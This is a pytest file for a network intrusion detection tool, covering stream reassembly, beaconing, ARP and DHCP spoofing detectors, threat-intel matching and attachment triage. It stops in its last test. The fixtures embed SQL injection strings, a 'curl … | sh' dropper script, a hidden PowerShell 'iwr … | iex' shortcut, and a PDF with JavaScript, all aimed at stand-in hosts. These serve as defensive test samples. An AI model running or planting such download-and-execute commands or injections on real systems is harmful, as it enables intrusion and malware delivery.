"""
Tests for the visibility work:

* stream continuity — HTTP requests and signature patterns split across segments
* beaconing tracked by host name, slow beacons, sleep gaps
* layer 2 — ARP, ICMP, DHCP decoding and the LAN detectors
* threat intel — TLS fingerprints, certificates, CNAME targets, listed pages, probes
* indicator extraction — new types, and what is inside attachments
"""
from __future__ import annotations

import gzip
import io
import struct
import tarfile
import zipfile
import zlib

import pytest

from pynids.alerts.manager import AlertManager
from pynids.alerts.model import AlertType, Severity
from pynids.detection.behavioral import BeaconingDetector
from pynids.detection.lan import ArpSpoofDetector, PingSweepDetector, RogueServiceDetector
from pynids.detection.signature import SignatureDetector
from pynids.detection.stealth import TrackerDetector
from pynids.engine import BUILTIN_RULES, DetectionEngine
from pynids.flow.stream import StreamWindow
from pynids.flow.tracker import FlowTracker
from pynids.intel.threat_intel import ThreatIntel
from pynids.protocols.dissector import dissect
from pynids.sniffer import decode_frame
from pynids.soc.ioc import classify, extract
from pynids.soc.mail import filetype
from pynids.soc.mail.analyze import analyze

from .conftest import AlertCollector, make_meta

CLIENT, SERVER = "192.168.1.10", "93.184.216.34"
SYN, ACK, PSH_ACK, SYNACK, RST = 0x02, 0x10, 0x18, 0x12, 0x14


def _engine(rules=None, intel=None, config=None):
    sink = AlertCollector()
    mgr = AlertManager(correlation_threshold=99)
    mgr.register_output(sink)
    return DetectionEngine(config=config or {}, rules_path=rules, intel=intel, alert_manager=mgr), sink


def _seg(payload, seq, sport=50000, dport=8081, flags=PSH_ACK, src=CLIENT, dst=SERVER, ts=1000.0):
    meta = make_meta(src_ip=src, dst_ip=dst, src_port=sport, dst_port=dport, payload=payload,
                     tcp_flags=flags, timestamp=ts)
    meta["tcp_seq"] = seq
    return meta


# ---------------------------------------------------------------------------
# Stream continuity
# ---------------------------------------------------------------------------

class TestHttpReassembly:
    REQUEST = b"GET /item?id=1%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1\r\nHost: shop.test\r\nUser-Agent: x\r\n\r\n"

    def test_request_split_inside_the_request_line(self):
        engine, sink = _engine()
        first, rest = self.REQUEST[:14], self.REQUEST[14:]
        assert engine.process_packet(_seg(first, 100, sport=50001)) == []
        alerts = engine.process_packet(_seg(rest, 100 + len(first), sport=50001))
        assert any("sqli" in a.tags for a in alerts)
        assert any("shop.test" in str(a.evidence.get("host")) for a in alerts if "sqli" in a.tags)

    def test_request_split_across_three_segments_with_retransmission(self):
        key_port = 50002
        parts = [self.REQUEST[:20], self.REQUEST[20:60], self.REQUEST[60:]]
        results, seq = [], 500
        for i, part in enumerate(parts):
            results.append(dissect(_seg(part, seq, sport=key_port)))
            if i == 0:  # the first segment is sent twice
                results.append(dissect(_seg(part, seq, sport=key_port)))
            seq += len(part)
        assert all(r["http"] == {"partial": True} for r in results[:-1])
        http = results[-1]["http"]
        assert http["uri"].startswith("/item?id=1%20UNION")
        assert http["host"] == "shop.test" and http["sqli_suspect"] is True
        assert results[-1]["reassembled"] is True

    def test_post_body_in_a_second_segment(self):
        head = b"POST /login HTTP/1.1\r\nHost: shop.test\r\nContent-Length: 27\r\n\r\n"
        body = b"user=a' OR '1'='1&pass=x123"
        assert dissect(_seg(head, 10, sport=50003))["http"] == {"partial": True}
        http = dissect(_seg(body, 10 + len(head), sport=50003))["http"]
        assert http["method"] == "POST" and http["sqli_suspect"] is True

    def test_whole_request_is_unchanged(self):
        layer7 = dissect(_seg(self.REQUEST, 1, sport=50004))
        assert layer7["http"]["sqli_suspect"] is True and "reassembled" not in layer7


class TestStreamWindow:
    RULE = [{"id": "T-SPLIT", "severity": "HIGH",
             "match": {"all": [{"field": "payload_bytes", "op": "contains", "value": "EVILTOKEN"}]}}]

    def test_window_tracks_order_holes_and_retransmits(self):
        win = StreamWindow(tail_bytes=8)
        assert win.update(_seg(b"", 99, flags=SYN)) is None
        assert win.update(_seg(b"abcdef", 100)) is None                 # first data: nothing before it
        assert win.update(_seg(b"ghij", 106)) == b"abcdef"
        retransmit = _seg(b"ghij", 106)
        assert win.update(retransmit) is None and retransmit["tcp_retransmit"] is True
        assert win.update(_seg(b"zz", 200)) is None                     # a hole: no prefix
        assert win.update(_seg(b"yy", 202)) == b"zz"
        assert win.update(_seg(b"\x17\x03\x03 secret", 204), opaque=True) is None
        assert win.update(_seg(b"more", 216)) is None                   # encrypted: nothing is kept

    def test_pattern_split_across_segments_fires_once(self):
        det = SignatureDetector(self.RULE)
        a, b, c = b"junk junk EVIL", b"TOKEN and more", b"trailing data"
        first = _seg(a, 1)
        assert list(det.analyze(first, {}, None)) == []
        second = _seg(b, 1 + len(a))
        second["stream_prefix"] = a
        alerts = list(det.analyze(second, {}, None))
        assert len(alerts) == 1 and alerts[0].evidence["reassembled"] is True
        assert b"EVILTOKEN" in alerts[0].evidence["payload_preview"]
        third = _seg(c, 1 + len(a) + len(b))
        third["stream_prefix"] = a + b      # the match now lies wholly in the past
        assert list(det.analyze(third, {}, None)) == []

    def test_pattern_inside_one_packet_is_not_reported_again(self):
        det = SignatureDetector(self.RULE)
        a = b"has EVILTOKEN inside"
        assert len(list(det.analyze(_seg(a, 1), {}, None))) == 1
        nxt = _seg(b"next", 1 + len(a))
        nxt["stream_prefix"] = a
        assert list(det.analyze(nxt, {}, None)) == []

    def test_engine_end_to_end_and_retransmits_not_counted(self):
        engine, sink = _engine()
        engine._detectors[0].update_rules(self.RULE)
        a, b = b"binary\x00data EVIL", b"TOKEN tail"
        engine.process_packet(_seg(b"", 999, sport=50010, dport=9999, flags=SYN))
        engine.process_packet(_seg(a, 1000, sport=50010, dport=9999))
        engine.process_packet(_seg(a, 1000, sport=50010, dport=9999))   # retransmission
        alerts = engine.process_packet(_seg(b, 1000 + len(a), sport=50010, dport=9999))
        assert [x.rule_id for x in alerts] == ["T-SPLIT"]
        flow = engine.flows(limit=1)[0]
        assert flow["bytes_out"] == len(a) + len(b)

    def test_startswith_still_means_the_packet(self):
        det = SignatureDetector([{"id": "T-START", "severity": "LOW", "match": {"all": [
            {"field": "payload_bytes", "op": "startswith", "value": "HELO"},
            {"field": "payload_bytes", "op": "contains", "value": "x"}]}}])
        meta = _seg(b"then x", 10)
        meta["stream_prefix"] = b"HELO "
        assert list(det.analyze(meta, {}, None)) == []


# ---------------------------------------------------------------------------
# Beaconing
# ---------------------------------------------------------------------------

class TestBeaconing:
    @staticmethod
    def _run(times, ips, context=None, **kw):
        det, tracker, out = BeaconingDetector(**kw), FlowTracker(), []
        for i, t in enumerate(times):
            meta = make_meta(src_ip=CLIENT, dst_ip=ips[i % len(ips)], src_port=40000 + i, dst_port=443,
                             tcp_flags=SYN, timestamp=t)
            out += det.analyze(meta, {"context": context} if context else {}, tracker.update(meta))
            det.prune(t)
        return out

    def test_rotating_addresses_of_one_verified_host(self):
        ips = [f"45.1.1.{i}" for i in range(1, 9)]
        times = [1000.0 + 60 * i for i in range(30)]
        assert self._run(times, ips) == []                       # by address: 8 thin series
        alerts = self._run(times, ips, {"remote_host": "cdn.c2.example"})
        assert len(alerts) == 1 and alerts[0].evidence["tracked_by"] == "hostname"
        assert alerts[0].severity == Severity.MEDIUM

    def test_claimed_name_does_not_merge_addresses(self):
        ips = [f"45.1.1.{i}" for i in range(1, 9)]
        ctx = {"remote_host": "cdn.c2.example", "remote_host_unverified": True}
        assert self._run([1000.0 + 60 * i for i in range(30)], ips, ctx) == []

    def test_two_hour_beacon(self):
        alerts = self._run([1000.0 + 7200 * i for i in range(10)], ["45.1.1.1"])
        assert len(alerts) == 1 and alerts[0].evidence["mean_interval_seconds"] == 7200

    def test_sleep_gap_does_not_hide_a_beacon(self):
        times = [1000.0 + 300 * i for i in range(5)]
        times += [times[-1] + 8 * 3600 + 300 * i for i in range(6)]   # lid closed overnight
        alerts = self._run(times, ["45.1.1.1"])
        assert len(alerts) == 1 and alerts[0].evidence["long_gaps_set_aside"] == 1

    def test_irregular_connections_do_not_alert(self):
        times = [1000.0, 1010.0, 1400.0, 1420.0, 3000.0, 3900.0, 4000.0, 9000.0, 9100.0, 15000.0]
        assert self._run(times, ["45.1.1.1"]) == []


# ---------------------------------------------------------------------------
# Layer 2 decoding
# ---------------------------------------------------------------------------

def _mac(text):
    return bytes.fromhex(text.replace(":", ""))


def _ip(text):
    return bytes(int(p) for p in text.split("."))


def _arp_frame(op, sender_mac, sender_ip, target_ip, target_mac="00:00:00:00:00:00"):
    eth = _mac("ff:ff:ff:ff:ff:ff") + _mac(sender_mac) + b"\x08\x06"
    return eth + struct.pack("!HHBBH", 1, 0x0800, 6, 4, op) + _mac(sender_mac) + _ip(sender_ip) \
        + _mac(target_mac) + _ip(target_ip)


def _arp_meta(op, mac, ip, target="192.168.1.99", ts=1000.0):
    return decode_frame(_arp_frame(1 if op == "request" else 2, mac, ip, target), "Ether", ts)


def _dhcp_payload(msg_type, server, router, your_ip="192.168.1.50", hostname=None):
    body = bytearray(240)
    body[0] = 2 if msg_type in (2, 5) else 1
    body[1], body[2] = 1, 6
    body[16:20] = _ip(your_ip)
    body[28:34] = _mac("aa:bb:cc:00:00:01")
    body[236:240] = b"\x63\x82\x53\x63"
    opts = bytes([53, 1, msg_type, 54, 4]) + _ip(server) + bytes([3, 4]) + _ip(router) \
        + bytes([6, 8]) + _ip(router) + _ip("9.9.9.9")
    if hostname:
        opts += bytes([12, len(hostname)]) + hostname.encode()
    return bytes(body) + opts + b"\xff"


class TestLinkLayerDecoding:
    def test_arp_frame(self):
        meta = _arp_meta("reply", "aa:bb:cc:dd:ee:01", "192.168.1.1", "192.168.1.10")
        assert meta["protocol"] == "arp" and meta["src_ip"] is None
        assert meta["arp"] == {"op": "reply", "sender_mac": "aa:bb:cc:dd:ee:01", "sender_ip": "192.168.1.1",
                               "target_mac": "00:00:00:00:00:00", "target_ip": "192.168.1.10"}
        assert meta["src_mac"] == "aa:bb:cc:dd:ee:01"

    def test_arp_frames_pass_through_the_engine(self):
        engine, _ = _engine()
        assert engine.process_packet(_arp_meta("request", "aa:bb:cc:dd:ee:01", "192.168.1.1")) == []

    def test_tcp_sequence_macs_and_icmp_type(self):
        eth = _mac("aa:aa:aa:aa:aa:01") + _mac("bb:bb:bb:bb:bb:02") + b"\x08\x00"
        tcp = struct.pack("!HHIIBBHHH", 1234, 80, 0xDEADBEEF, 0, 5 << 4, 0x18, 1024, 0, 0) + b"hi"
        ip = bytes([0x45, 0]) + struct.pack("!H", 20 + len(tcp)) + bytes([0, 0, 0, 0, 64, 6, 0, 0]) \
            + _ip("10.0.0.1") + _ip("10.0.0.2")
        meta = decode_frame(eth + ip + tcp, "Ether", 1.0)
        assert meta["tcp_seq"] == 0xDEADBEEF and meta["payload_bytes"] == b"hi"
        assert meta["src_mac"] == "bb:bb:bb:bb:bb:02" and meta["dst_mac"] == "aa:aa:aa:aa:aa:01"

        icmp = bytes([3, 3, 0, 0, 0, 0, 0, 0])
        ip = bytes([0x45, 0]) + struct.pack("!H", 28) + bytes([0, 0, 0, 0, 64, 1, 0, 0]) \
            + _ip("10.0.0.1") + _ip("10.0.0.2")
        meta = decode_frame(eth + ip + icmp, "Ether", 1.0)
        assert (meta["protocol"], meta["icmp_type"], meta["icmp_code"]) == ("icmp", 3, 3)

    def test_dhcp_is_dissected(self):
        payload = _dhcp_payload(5, "192.168.1.1", "192.168.1.1", hostname="laptop")
        layer7 = dissect(make_meta(src_ip="192.168.1.1", dst_ip="192.168.1.50", src_port=67, dst_port=68,
                                   protocol="udp", payload=payload))
        dhcp = layer7["dhcp"]
        assert layer7["app_proto"] == "dhcp" and dhcp["msg_type"] == "ACK" and dhcp["op"] == "reply"
        assert dhcp["server_id"] == "192.168.1.1" and dhcp["routers"] == ["192.168.1.1"]
        assert dhcp["dns_servers"] == ["192.168.1.1", "9.9.9.9"] and dhcp["hostname"] == "laptop"
        assert dhcp["your_ip"] == "192.168.1.50" and dhcp["client_mac"] == "aa:bb:cc:00:00:01"


# ---------------------------------------------------------------------------
# LAN detectors
# ---------------------------------------------------------------------------

ROUTER_MAC, EVIL_MAC = "aa:bb:cc:dd:ee:01", "de:ad:be:ef:00:66"


class TestArpSpoof:
    @staticmethod
    def _run(det, metas):
        out = []
        for meta in metas:
            out += det.analyze(meta, {}, None)
        return out

    def test_gateway_changing_mac(self):
        det = ArpSpoofDetector(gateways=lambda: {"192.168.1.1"})
        alerts = self._run(det, [
            _arp_meta("reply", ROUTER_MAC, "192.168.1.1", ts=1000),
            _arp_meta("reply", ROUTER_MAC, "192.168.1.1", ts=1030),
            _arp_meta("reply", EVIL_MAC, "192.168.1.1", ts=1060),
        ])
        assert [a.rule_id for a in alerts] == ["LAN-ARP-GATEWAY"]
        assert alerts[0].severity == Severity.HIGH
        assert alerts[0].evidence["previous_mac"] == ROUTER_MAC and alerts[0].evidence["new_mac"] == EVIL_MAC

    def test_gateway_learned_from_dhcp(self):
        det = ArpSpoofDetector(gateways=None)
        ack = {"dhcp": {"msg_type": "ACK", "routers": ["192.168.1.1"]}}
        assert list(det.analyze(make_meta(protocol="udp"), ack, None)) == []
        alerts = self._run(det, [_arp_meta("reply", ROUTER_MAC, "192.168.1.1", ts=1000),
                                 _arp_meta("reply", EVIL_MAC, "192.168.1.1", ts=1010)])
        assert [a.rule_id for a in alerts] == ["LAN-ARP-GATEWAY"]

    def test_new_lease_forgets_the_previous_network(self):
        det = ArpSpoofDetector(gateways=lambda: {"192.168.1.1"})
        self._run(det, [_arp_meta("reply", ROUTER_MAC, "192.168.1.1", ts=1000)])
        list(det.analyze(make_meta(protocol="udp"), {"dhcp": {"msg_type": "ACK", "routers": ["192.168.1.1"]}}, None))
        # Another network that also uses 192.168.1.1, with its own router.
        assert self._run(det, [_arp_meta("reply", "11:22:33:44:55:66", "192.168.1.1", ts=1100)]) == []

    def test_one_change_is_a_lease_two_is_a_conflict(self):
        det = ArpSpoofDetector(gateways=lambda: set())
        a, b = "aa:aa:aa:00:00:01", "bb:bb:bb:00:00:02"
        metas = [_arp_meta("reply", a, "192.168.1.40", ts=1000), _arp_meta("reply", b, "192.168.1.40", ts=1010)]
        assert self._run(det, metas) == []
        alerts = self._run(det, [_arp_meta("reply", a, "192.168.1.40", ts=1020)])
        assert [x.rule_id for x in alerts] == ["LAN-ARP-CONFLICT"] and sorted(alerts[0].evidence["macs"]) == [a, b]

    def test_one_mac_answering_for_many_addresses(self):
        det = ArpSpoofDetector(gateways=lambda: set())
        metas = [_arp_meta("reply", EVIL_MAC, f"192.168.1.{i}", ts=1000 + i) for i in range(10, 16)]
        alerts = self._run(det, metas)
        assert [x.rule_id for x in alerts] == ["LAN-ARP-MULTI"] and alerts[0].evidence["count"] == 5

    def test_arp_sweep(self):
        det = ArpSpoofDetector(gateways=lambda: set(), sweep_threshold=30)
        metas = [_arp_meta("request", EVIL_MAC, "192.168.1.66", target=f"192.168.1.{i}", ts=1000 + i * 0.1)
                 for i in range(1, 60)]
        assert [x.rule_id for x in self._run(det, metas)] == ["LAN-ARP-SWEEP"]

    def test_address_probes_and_normal_traffic_are_quiet(self):
        det = ArpSpoofDetector(gateways=lambda: {"192.168.1.1"})
        metas = [_arp_meta("request", "aa:aa:aa:00:00:01", "0.0.0.0", target="192.168.1.40", ts=1000),
                 _arp_meta("reply", ROUTER_MAC, "192.168.1.1", ts=1001),
                 _arp_meta("request", "aa:aa:aa:00:00:01", "192.168.1.40", target="192.168.1.1", ts=1002),
                 _arp_meta("reply", ROUTER_MAC, "192.168.1.1", ts=1300)]
        assert self._run(det, metas) == []
        det.prune(1000 + 86400)
        assert not det._bindings and not det._claims and not det._asked


class TestPingSweepAndRogueServices:
    def test_ping_sweep(self):
        det, out = PingSweepDetector(threshold=20), []
        for i in range(1, 40):
            meta = make_meta(src_ip="192.168.1.66", dst_ip=f"192.168.1.{i}", protocol="icmp", timestamp=1000 + i * 0.2)
            meta["icmp_type"], meta["src_port"], meta["dst_port"] = 8, None, None
            out += det.analyze(meta, {}, None)
        assert len(out) == 1 and "ping_sweep" in out[0].tags and out[0].detection_id == "detector:ping_sweep"

    def test_pinging_one_host_is_not_a_sweep(self):
        det, out = PingSweepDetector(threshold=20), []
        for i in range(100):
            meta = make_meta(src_ip="192.168.1.66", dst_ip="192.168.1.1", protocol="icmp", timestamp=1000 + i)
            meta["icmp_type"] = 8
            out += det.analyze(meta, {}, None)
        assert out == []

    @staticmethod
    def _offer(server, mac, ts, router=None):
        meta = make_meta(src_ip=server, dst_ip="255.255.255.255", src_port=67, dst_port=68, protocol="udp",
                         timestamp=ts)
        meta["src_mac"] = mac
        return meta, {"dhcp": {"op": "reply", "msg_type": "OFFER", "server_id": server,
                               "routers": [router or server], "dns_servers": [router or server]}}

    def test_two_dhcp_servers_at_once(self):
        det = RogueServiceDetector()
        assert list(det.analyze(*self._offer("192.168.1.1", ROUTER_MAC, 1000), None)) == []
        assert list(det.analyze(*self._offer("192.168.1.1", ROUTER_MAC, 1010), None)) == []
        alerts = list(det.analyze(*self._offer("192.168.1.66", EVIL_MAC, 1020, router="192.168.1.66"), None))
        assert [a.rule_id for a in alerts] == ["LAN-DHCP-ROGUE"]
        assert {s["server"] for s in alerts[0].evidence["servers"]} == {"192.168.1.1", "192.168.1.66"}
        assert list(det.analyze(*self._offer("192.168.1.1", ROUTER_MAC, 1030), None)) == []   # once per pair

    def test_a_different_network_later_is_not_rogue(self):
        det = RogueServiceDetector(window=600)
        list(det.analyze(*self._offer("192.168.1.1", ROUTER_MAC, 1000), None))
        assert list(det.analyze(*self._offer("10.0.0.1", "11:22:33:44:55:66", 1000 + 3600), None)) == []

    def test_second_ipv6_router(self):
        det = RogueServiceDetector()

        def ra(mac, src, ts):
            meta = make_meta(src_ip=src, dst_ip="ff02::1", protocol="other", timestamp=ts)
            meta.update(icmp_type=134, ra_lifetime=1800, src_mac=mac)
            return meta
        assert list(det.analyze(ra(ROUTER_MAC, "fe80::1", 1000), {}, None)) == []
        alerts = list(det.analyze(ra(EVIL_MAC, "fe80::66", 1100), {}, None))
        assert [a.rule_id for a in alerts] == ["LAN-RA-ROUTER"]

    def test_engine_runs_the_lan_detectors(self):
        engine, sink = _engine()
        assert {"lan_arp", "ping_sweep", "lan_rogue_service"} <= set(engine.rules()["detectors"])
        off, _ = _engine(config={"lan": {"enabled": False}})
        assert "lan_arp" not in off.rules()["detectors"]


# ---------------------------------------------------------------------------
# Threat intel
# ---------------------------------------------------------------------------

class TestIntelMatching:
    @staticmethod
    def _intel():
        ti = ThreatIntel()
        ti.add_network("203.0.113.50", "c2", "CRITICAL", "test C2")
        ti.add_domain("tracker-c2.example", "c2", "HIGH", "test domain")
        ti.add_url("https://sites.shared.example/u/login.php", "phishing", "HIGH", "test page")
        ti.add_fingerprint("ja3", "ab" * 16, "malware", "MEDIUM", "test ja3")
        ti.add_fingerprint("cert_sha1", "cd" * 20, "c2", "HIGH", "test cert")
        return ti

    def test_unanswered_inbound_attempt_is_low_then_full_once_answered(self):
        engine, sink = _engine(intel=self._intel())
        syn = _seg(b"", 1, src="203.0.113.50", dst=CLIENT, sport=44444, dport=22, flags=SYN)
        probe = [a for a in engine.process_packet(syn) if a.alert_type == AlertType.THREAT_INTEL]
        assert [a.rule_id for a in probe] == ["INTEL-INBOUND-PROBE"] and probe[0].severity == Severity.LOW
        assert probe[0].evidence["listed_severity"] == "CRITICAL"
        engine.process_packet(_seg(b"", 9, src=CLIENT, dst="203.0.113.50", sport=22, dport=44444, flags=SYNACK))
        later = engine.process_packet(_seg(b"", 2, src="203.0.113.50", dst=CLIENT, sport=44444, dport=22, flags=ACK))
        full = [a for a in later if a.alert_type == AlertType.THREAT_INTEL]
        assert full and full[0].severity == Severity.CRITICAL and full[0].rule_id is None

    def test_outbound_connection_to_listed_address_is_full_severity(self):
        engine, sink = _engine(intel=self._intel())
        alerts = engine.process_packet(_seg(b"", 1, dst="203.0.113.50", dport=443, flags=SYN))
        assert [a.severity for a in alerts if a.alert_type == AlertType.THREAT_INTEL] == [Severity.CRITICAL]

    def test_ja3_certificate_cname_and_page(self):
        engine, sink = _engine(intel=self._intel())
        ti = engine._run_threat_intel
        base = make_meta(src_ip=CLIENT, dst_ip=SERVER, dst_port=443)
        ja3 = ti(base, {"tls": {"ja3": "AB" * 16, "sni": "x.test"}})
        assert len(ja3) == 1 and "ja3" in ja3[0].tags and ja3[0].severity == Severity.MEDIUM

        server_pkt = make_meta(src_ip=SERVER, dst_ip=CLIENT, src_port=443, dst_port=50000)
        cert = ti(server_pkt, {"tls": {"cert": {"sha1": "cd" * 20, "subject": "CN=x"}}})
        assert len(cert) == 1 and "certificate" in cert[0].tags
        assert cert[0].src_ip == CLIENT and cert[0].dst_ip == SERVER

        answer = make_meta(src_ip="192.168.1.1", dst_ip=CLIENT, src_port=53, dst_port=5353, protocol="udp")
        dns = {"dns": {"is_response": True, "query_name": "metrics.shop.example", "answers": [
            {"name": "metrics.shop.example", "type": "CNAME", "data": "edge.tracker-c2.example", "ttl": 60},
            {"name": "edge.tracker-c2.example", "type": "A", "data": "198.51.100.3", "ttl": 60}]}}
        ti.__self__._intel.add_domain(".tracker-c2.example", "c2", "HIGH", "test zone")
        cname = ti(answer, dns)
        assert len(cname) == 1 and cname[0].evidence["cname_target"] == "edge.tracker-c2.example"
        assert cname[0].src_ip == CLIENT

        page = ti(base, {"http": {"direction": "request", "host": "sites.shared.example", "uri": "/u/login.php"}})
        assert len(page) == 1 and page[0].evidence["matched_indicator"].endswith("/u/login.php")
        assert ti(base, {"http": {"direction": "request", "host": "sites.shared.example", "uri": "/other"}}) == []

    def test_cname_cloaked_tracker(self):
        det = TrackerDetector(extra_domains={"adco.example": "AdCo (Advertising)"})
        answer = make_meta(src_ip="192.168.1.1", dst_ip=CLIENT, src_port=53, dst_port=5353, protocol="udp")
        dns = {"dns": {"is_response": True, "query_name": "stats.shop.example", "answers": [
            {"name": "stats.shop.example", "type": "CNAME", "data": "shop.px.adco.example", "ttl": 60}]}}
        alerts = list(det.analyze(answer, dns, None))
        assert len(alerts) == 1 and "cname_cloaking" in alerts[0].tags and alerts[0].src_ip == CLIENT
        assert list(det.analyze(answer, dns, None)) == []          # once per client and name
        plain = {"dns": {"is_response": True, "query_name": "www.shop.example", "answers": [
            {"name": "www.shop.example", "type": "A", "data": "198.51.100.9", "ttl": 60}]}}
        assert list(det.analyze(answer, plain, None)) == []


# ---------------------------------------------------------------------------
# Indicators
# ---------------------------------------------------------------------------

class TestIndicatorTypes:
    @pytest.mark.parametrize("raw,kind,value", [
        ("45.9.1.2:8443", "ipv4", "45.9.1.2"),
        ("[2001:db8::1]:443", "ipv6", "2001:db8::1"),
        ("10.2.0.0/16", "cidr", "10.2.0.0/16"),
        ("2001:db8::/32", "cidr", "2001:db8::/32"),
        ("bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq", "wallet", "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"),
        ("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "wallet", "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"),
        ("0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe", "wallet", "0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe"),
        ("HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Run", "regkey",
         "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Run"),
        ("C:\\Users\\Public\\upd.exe", "filepath", "C:\\Users\\Public\\upd.exe"),
        ("%APPDATA%\\Microsoft\\upd.dll", "filepath", "%APPDATA%\\Microsoft\\upd.dll"),
        ("/tmp/.x/payload.sh", "filepath", "/tmp/.x/payload.sh"),
    ])
    def test_classify(self, raw, kind, value):
        ioc = classify(raw)
        assert ioc is not None and (ioc.type, ioc.value) == (kind, value)
        assert ioc.original == raw     # the port, when there is one, is kept here

    @pytest.mark.parametrize("raw", ["1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb", "a/b", "3/4", "and/or", "1.2.3.4:99999"])
    def test_not_indicators(self, raw):
        assert classify(raw) is None

    def test_extract_from_a_report(self):
        text = ("Beacons to 45.9.1.2:8443 inside 10.2.0.0/16. Ransom wallet bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq. "
                "Persistence: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd was set, then it dropped "
                "C:\\Program Files\\Evil Corp\\a.dll and /tmp/.x/payload.sh. See https://evil.example/a/b.php, "
                "version 1.2.3.4, src/app/main.py, 3/4 done.")
        got = {(i.type, i.value) for i in extract(text)}
        assert got == {
            ("ipv4", "45.9.1.2"), ("cidr", "10.2.0.0/16"),
            ("wallet", "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"),
            ("regkey", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd"),
            ("filepath", "C:\\Program Files\\Evil Corp\\a.dll"), ("filepath", "/tmp/.x/payload.sh"),
            ("url", "https://evil.example/a/b.php"),
        }
        assert next(i for i in extract(text) if i.type == "ipv4").original == "45.9.1.2:8443"


def _pdf_with_compressed_link(url):
    objects = f"<< /Type /Annot /Subtype /Link /A << /S /URI /URI ({url}) >> >> /OpenAction << /S /JavaScript >>"
    stream = zlib.compress(objects.encode())
    return (b"%PDF-1.7\n1 0 obj\n<< /Type /ObjStm /Filter /FlateDecode /Length " + str(len(stream)).encode()
            + b" >>\nstream\n" + stream + b"\nendstream\nendobj\n%%EOF\n")


def _zip_bytes(members):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in members.items():
            zf.writestr(name, data)
    return buf.getvalue()


class TestInsideAttachments:
    def test_pdf_link_inside_a_compressed_stream(self):
        pdf = _pdf_with_compressed_link("https://login.phish.example/verify")
        assert b"phish.example" not in pdf          # invisible to a scan of the raw file
        tri = filetype.analyze_file(pdf, "invoice.pdf", "application/pdf")
        assert tri["pdf_uris"] == ["https://login.phish.example/verify"]
        assert "https://login.phish.example/verify" in tri["urls"]
        assert "/JavaScript" in tri["pdf_keywords"]
        assert any(f["title"] == "PDF contains active content" for f in tri["findings"])

    def test_archive_inside_an_archive(self):
        inner = _zip_bytes({"readme.txt": "contact http://198.51.100.77/gate.php",
                            "invoice.pdf.exe": b"MZ" + b"\x00" * 64})
        outer = _zip_bytes({"docs/inner.zip": inner})
        tri = filetype.analyze_file(outer, "docs.zip", "application/zip")
        nested = tri["nested"][0]
        assert nested["name"] == "docs/inner.zip" and nested["detected"] == "ZIP archive"
        assert {n["name"] for n in nested["nested"]} == {"readme.txt", "invoice.pdf.exe"}
        titles = " | ".join(f["title"] + " " + f["detail"] for f in tri["findings"])
        assert "Inside the archive" in titles and "invoice.pdf.exe" in titles and "Double extension" in titles
        assert "http://198.51.100.77/gate.php" in tri["urls"]

    def test_tar_gz(self):
        raw = io.BytesIO()
        with tarfile.open(fileobj=raw, mode="w") as tf:
            data = b"#!/bin/sh\ncurl http://203.0.113.9/x | sh\n"
            member = tarfile.TarInfo("drop/run.sh")
            member.size = len(data)
            tf.addfile(member, io.BytesIO(data))
        tri = filetype.analyze_file(gzip.compress(raw.getvalue()), "bundle.tar.gz", None)
        assert tri["detected"] == "gzip" and tri["nested"][0]["detected"] == "tar archive"
        assert any("drop/run.sh" in f["detail"] for f in tri["findings"])
        assert "http://203.0.113.9/x" in tri["urls"]

    def test_depth_is_bounded(self):
        data = _zip_bytes({"a.txt": "x"})
        for i in range(8):
            data = _zip_bytes({f"level{i}.zip": data})
        tri = filetype.analyze_file(data, "deep.zip", None)
        depth, node = 0, tri
        while node.get("nested"):
            node, depth = node["nested"][0], depth + 1
        assert depth == filetype.MAX_DEPTH

    def test_office_boilerplate_is_not_an_indicator(self):
        rels = ('<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                '<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
                'attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>')
        doc = _zip_bytes({"word/document.xml": '<w:document xmlns:w="http://schemas.openxmlformats.org/x"/>',
                          "word/_rels/settings.xml.rels": rels})
        tri = filetype.analyze_file(doc, "letter.docx", None)
        assert tri["urls"] == ["https://evil.example/t.dotm"]
        assert any("external content" in f["title"] for f in tri["findings"])

    def test_shortcut_command_line(self):
        lnk = b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 68 \
            + "powershell -w hidden -c iwr http://198.51.100.5/a.ps1 | iex".encode("utf-16-le")
        tri = filetype.analyze_file(lnk, "Invoice.pdf.lnk", None)
        finding = next(f for f in tri["findings"] if f["title"] == "Shortcut launches a command interpreter")
        assert "powershell" in finding["detail"] and "http://198.51.100.5/a.ps1" in tri["urls"]

    def test_unopenable_archive_says_so(self):
        tri = filetype.analyze_file(b"Rar!\x1a\x07\x00" + b"\x00" * 50, "x.rar", None)
        assert any("contents not examined" in f["title"] for f in tri["findings"])

    def test_email_surfaces_what_is_inside_the_attachment(self):
        import base64
        pdf = _pdf_with_compressed_link("https://login.phish.example/verify")
        archive = _zip_bytes({"invoice.pdf": pdf, "note.txt": "call back 45.9.1.2:4444"})
        eml = (b"From: Billing <billing@vendor.example>\r\nTo: a@corp.example\r\nSubject: Invoice\r\n"
               b"Message-ID: <1@vendor.example>\r\nMIME-Version: 1.0\r\n"
               b"Content-Type: multipart/mixed; boundary=\"b\"\r\n\r\n--b\r\nContent-Type: text/plain\r\n\r\n"
               b"See attached.\r\n--b\r\nContent-Type: application/zip; name=\"invoice.zip\"\r\n"
               b"Content-Disposition: attachment; filename=\"invoice.zip\"\r\n"
               b"Content-Transfer-Encoding: base64\r\n\r\n" + base64.encodebytes(archive) + b"--b--\r\n")
        report = analyze(eml)
